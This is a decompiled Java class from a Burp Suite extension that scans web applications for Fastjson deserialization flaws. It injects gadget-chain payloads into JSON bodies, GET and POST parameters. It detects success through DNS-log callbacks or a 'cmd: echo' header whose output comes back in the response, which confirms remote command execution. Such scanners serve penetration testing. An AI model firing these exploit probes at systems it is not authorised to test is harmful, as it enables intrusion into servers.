/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.Common;
import burp.GenPoc;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.Listen.IBackend;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;
import java.util.List;

public class FastJsonScan {
    public static IHttpRequestResponse FastjsonScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog) throws UnsupportedEncodingException {
        block21: {
            IHttpRequestResponse requestResponse;
            String host;
            String reqMethod;
            block22: {
                if (baseRequestResponse.getRequest() == null) break block21;
                IRequestInfo analyzeRequest = helpers.analyzeRequest(baseRequestResponse);
                List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
                host = baseRequestResponse.getHttpService().getHost();
                String newhost = "fjson" + GenPoc.Makenewhost(host);
                if (reqMethod.toLowerCase().equals("post")) {
                    headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    boolean json = false;
                    boolean multipart = true;
                    for (String header : headers) {
                        if (header.contains("application/json")) {
                            json = true;
                        }
                        if (!header.contains("multipart/form-data")) continue;
                        multipart = false;
                    }
                    if (json && multipart) {
                        String domain_base = GenPoc.Makenewhost(host) + dnslog.getNewPayload();
                        List<String> pocs = GenPoc.GenFastJsonPoc(host, domain_base);
                        int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                        byte[] srcbody = baseRequestResponse.getRequest();
                        Object reqbody = Common.getpostParams(start, srcbody);
                        int j = 0;
                        Iterator iterator2 = pocs.iterator();
                        while (iterator2.hasNext()) {
                            IHttpRequestResponse requestResponse2;
                            byte[] body;
                            List<String> echoheaders;
                            String poc = (String)iterator2.next();
                            ++j;
                            if (poc.contains("unpooled.UnpooledDataSource")) {
                                int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                                echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                                echoheaders.add("Testecho:" + a);
                                body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                                requestResponse2 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                                if (requestResponse2 == null || requestResponse2.getResponse() == null) continue;
                                byte[] response = requestResponse2.getResponse();
                                IResponseInfo responseInfo = helpers.analyzeResponse(response);
                                List<String> respHeaders = responseInfo.getHeaders();
                                for (String h2 : respHeaders) {
                                    if (!h2.contains(Integer.toString(a))) continue;
                                    return requestResponse2;
                                }
                                continue;
                            }
                            if (poc.contains("dbcp.dbcp2")) {
                                int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                                echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                                echoheaders.add("cmd: echo " + a);
                                body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                                requestResponse2 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                                if (requestResponse2 == null || requestResponse2.getResponse() == null || !Common.getResbody(requestResponse2.getResponse(), helpers).contains(Integer.toString(a))) continue;
                                return requestResponse2;
                            }
                            if (poc.contains("dbcp.dbcp")) {
                                int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                                echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                                echoheaders.add("cmd: echo " + a);
                                body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                                requestResponse2 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                                if (requestResponse2 == null || requestResponse2.getResponse() == null || !Common.getResbody(requestResponse2.getResponse(), helpers).contains(Integer.toString(a))) continue;
                                return requestResponse2;
                            }
                            byte[] body2 = helpers.buildHttpMessage(headers, poc.getBytes(StandardCharsets.UTF_8));
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body2);
                            if (!dnslog.CheckResult("fjson" + Integer.toString(j) + domain_base)) continue;
                            return requestResponse;
                        }
                    }
                }
                if (!reqMethod.equalsIgnoreCase("get")) break block22;
                String domain_base = GenPoc.Makenewhost(host) + dnslog.getNewPayload();
                List<String> pocs = GenPoc.GenFastJsonPoc(host, domain_base);
                int j = 0;
                for (String poc : pocs) {
                    ++j;
                    List<String> targetList = Common.ParamAddPocGetFJson(headers.get(0), poc);
                    for (String target : targetList) {
                        byte[] body;
                        List<String> echoheaders;
                        if (poc.contains("unpooled.UnpooledDataSource")) {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("Testecho:" + a);
                            echoheaders.set(0, target);
                            body = helpers.buildHttpMessage(echoheaders, null);
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (requestResponse == null || requestResponse.getResponse() == null) continue;
                            byte[] response = requestResponse.getResponse();
                            IResponseInfo responseInfo = helpers.analyzeResponse(response);
                            List<String> respHeaders = responseInfo.getHeaders();
                            for (String h3 : respHeaders) {
                                if (!h3.contains(Integer.toString(a))) continue;
                                return requestResponse;
                            }
                            continue;
                        }
                        if (poc.contains("dbcp.dbcp2")) {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("cmd: echo " + a);
                            echoheaders.set(0, target);
                            body = helpers.buildHttpMessage(echoheaders, null);
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (requestResponse == null || requestResponse.getResponse() == null || !Common.getResbody(requestResponse.getResponse(), helpers).contains(Integer.toString(a))) continue;
                            return requestResponse;
                        }
                        if (poc.contains("dbcp.dbcp")) {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("cmd: echo " + a);
                            echoheaders.set(0, target);
                            body = helpers.buildHttpMessage(echoheaders, null);
                            requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (requestResponse == null || requestResponse.getResponse() == null || !Common.getResbody(requestResponse.getResponse(), helpers).contains(Integer.toString(a))) continue;
                            return requestResponse;
                        }
                        List<String> tmpheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                        tmpheaders.set(0, target);
                        byte[] body3 = helpers.buildHttpMessage(tmpheaders, null);
                        IHttpRequestResponse requestResponse3 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body3);
                        if (!dnslog.CheckResult("fjson" + Integer.toString(j) + domain_base)) continue;
                        return requestResponse3;
                    }
                }
                break block21;
            }
            if (!reqMethod.equalsIgnoreCase("post")) break block21;
            String domain_base = GenPoc.Makenewhost(host) + dnslog.getNewPayload();
            List<String> pocs = GenPoc.GenFastJsonPoc(host, domain_base);
            String reqbodystr = new String(Common.getpostParams(helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset(), baseRequestResponse.getRequest()), "utf-8");
            int j = 0;
            for (String poc : pocs) {
                ++j;
                List<String> targetList = Common.ParamAddPocPostFJson(reqbodystr, poc);
                for (String target : targetList) {
                    IHttpRequestResponse requestResponse4;
                    byte[] body;
                    List<String> echoheaders;
                    if (poc.contains("unpooled.UnpooledDataSource")) {
                        int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                        echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                        echoheaders.add("Testecho:" + a);
                        body = helpers.buildHttpMessage(echoheaders, target.getBytes(StandardCharsets.UTF_8));
                        requestResponse4 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        if (requestResponse4 == null || requestResponse4.getResponse() == null) continue;
                        byte[] response = requestResponse4.getResponse();
                        IResponseInfo responseInfo = helpers.analyzeResponse(response);
                        List<String> respHeaders = responseInfo.getHeaders();
                        for (String h4 : respHeaders) {
                            if (!h4.contains(Integer.toString(a))) continue;
                            return requestResponse4;
                        }
                        continue;
                    }
                    if (poc.contains("dbcp.dbcp2")) {
                        int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                        echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                        echoheaders.add("cmd: echo " + a);
                        body = helpers.buildHttpMessage(echoheaders, target.getBytes(StandardCharsets.UTF_8));
                        requestResponse4 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        if (requestResponse4 == null || requestResponse4.getResponse() == null || !Common.getResbody(requestResponse4.getResponse(), helpers).contains(Integer.toString(a))) continue;
                        return requestResponse4;
                    }
                    if (poc.contains("dbcp.dbcp")) {
                        int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                        echoheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                        echoheaders.add("cmd: echo " + a);
                        body = helpers.buildHttpMessage(echoheaders, target.getBytes(StandardCharsets.UTF_8));
                        requestResponse4 = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                        if (requestResponse4 == null || requestResponse4.getResponse() == null || !Common.getResbody(requestResponse4.getResponse(), helpers).contains(Integer.toString(a))) continue;
                        return requestResponse4;
                    }
                    List<String> tmpheaders = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                    byte[] body4 = helpers.buildHttpMessage(tmpheaders, target.getBytes(StandardCharsets.UTF_8));
                    requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body4);
                    if (!dnslog.CheckResult("fjson" + Integer.toString(j) + domain_base)) continue;
                    return requestResponse;
                }
            }
        }
        return null;
    }
}

